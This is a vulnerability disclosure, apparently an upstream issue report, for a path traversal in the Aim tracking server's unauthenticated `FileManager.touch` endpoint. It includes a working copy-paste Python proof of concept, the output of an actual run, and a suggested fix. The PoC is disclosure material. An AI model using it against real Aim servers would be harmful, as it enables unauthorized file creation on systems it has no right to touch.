# Aim tracking server: unauthenticated `FileManager.touch` path traversal creates files outside the repository

**Upstream issue:** https://github.com/aimhubio/aim/issues/3424

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2 Ubuntu 24.04 against a real `aim server`; output below is from the actual run)

## Reproduction conditions

- aim 3.29.1 (pip), Python 3.11, Ubuntu 24.04
- A running `aim server --repo <path>` with default settings (binds `0.0.0.0:53800`, **no authentication**)

## Description

`LocalFileManager.touch(filename)` in `aim/sdk/reporter/file_manager.py`:

```python
def touch(self, filename: str, cleanup_file_pattern=None):
    self.base_dir.mkdir(parents=True, exist_ok=True)
    new_path = self.base_dir / filename      # base_dir = <repo>/.aim/check_ins
    new_path.touch(exist_ok=True)
```

`filename` arrives from the remote `read-instruction` call and is joined without normalization or containment validation, so `../` segments escape the repository root. `LocalFileManager` is registered as a remotely obtainable resource (`get_file_manager` in `aim/ext/transport/handlers.py`).

## Impact (low severity, real boundary)

An unauthenticated network client of the tracking server can create empty files (or bump mtimes of existing files) at any server-writable relative location — e.g. pre-place filenames that later logic writes to, or refresh stale markers whose freshness is mtime-based. It only creates/touches files; it does not write content or overwrite existing file contents.

## PoC (copy-paste ready)

**Step 1 — server:** `aim server --repo /tmp/aim3423/mount_repo`

**Step 2 — attacker** (uses aim's own codecs; `check_ins` is `<repo>/.aim/check_ins`, so three `../` reach the repo's parent):

```python
import base64, requests
from aim.ext.transport.message_utils import pack_args
from aim.storage.treeutils import encode_tree

BASE = "http://<server>:53800/tracking/poc-attacker"
fm = requests.post(f"{BASE}/get-resource/",
                   json={"resource_handler": "", "resource_type": "FileManager",
                         "args": base64.b64encode(b"").decode()}).json()["handler"]

requests.post(f"{BASE}/read-instruction/",
              json={"resource_handler": fm, "method_name": "touch",
                    "args": base64.b64encode(
                        pack_args(encode_tree(("../../../escaped_marker.txt",)))).decode()})
```

**Step 3 — verify:** `/tmp/aim3423/escaped_marker.txt` exists — outside the repo (`/tmp/aim3423/mount_repo`).

## Execution result (actual run: aim 3.29.1 / Python 3.11 / Ubuntu 24.04)

```
[attacker] touch('../../../aim3424_escaped_marker.txt') -> HTTP 200
[evidence] file created outside repo root (/tmp/aim3423/aim3424_escaped_marker.txt): True
[RESULT-B] REPRODUCED - file escaped the repository

=== filesystem evidence ===
escaped marker outside repo: yes
repo root .aim still there:  yes
```

The marker appeared in the repo's parent directory (`/tmp/aim3423/`), confirming the unvalidated join escapes `<repo>/.aim/check_ins` and the repository root.

## Suggested fix

Normalize the joined path and reject anything not under `base_dir` (e.g. `new_path.resolve().is_relative_to(self.base_dir.resolve())`).
